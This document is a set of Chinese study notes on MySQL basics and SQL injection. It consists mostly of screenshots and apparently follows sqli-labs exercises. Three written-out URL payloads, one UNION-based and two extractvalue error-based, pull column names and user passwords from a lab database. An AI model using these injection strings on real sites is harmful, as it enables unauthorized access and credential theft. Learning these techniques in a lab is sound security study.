## 增删改

登录数据库 `mysql -uroot -p`

查看数据库 `show databases;`

创建数据库 `creare database <数据库名>charset utf8`

删除数据库 `drop database <数据库名>`

创建数据表 `create table <数据库名>`

## 数据库查询

![1686670206235](image/SQL/1686670206235.png)

![1686670621759](image/SQL/1686670621759.png)

![1686671869053](image/SQL/1686671869053.png)

![1686671912742](image/SQL/1686671912742.png)

![1686671950093](image/SQL/1686671950093.png)

## SQL注入基础

![1686703581560](image/SQL/1686703581560.png)

![1686703870062](image/SQL/1686703870062.png)

![1686703914643](image/SQL/1686703914643.png)

![1686704528929](image/SQL/1686704528929.png)

![1686704564533](image/SQL/1686704564533.png)

![1686707211907](image/SQL/1686707211907.png)

![1686707167676](image/SQL/1686707167676.png)

![1686706779060](image/SQL/1686706779060.png)

![1686706994634](image/SQL/1686706994634.png)

![1686707088801](image/SQL/1686707088801.png)

![1686709251217](image/SQL/1686709251217.png)

```sql
http://172.20.54.84/Less-2/?id=-1 union select 1,group_concat(column_name),(select group_concat(username,password) from users) from information_schema.columns where table_schema=database() and table_name='users' --+
```

## 报错注入

![1686709473763](image/SQL/1686709473763.png)

![1686710574190](image/SQL/1686710574190.png)

![1686710601191](image/SQL/1686710601191.png)

![1686710682586](image/SQL/1686710682586.png)

![1686712368312](image/SQL/1686712368312.png)

```sql
http://172.28.72.167/Less-5/?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')))--+
```

```sql
http://172.28.72.167/Less-5/?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,'~',password) from users )))--+
```
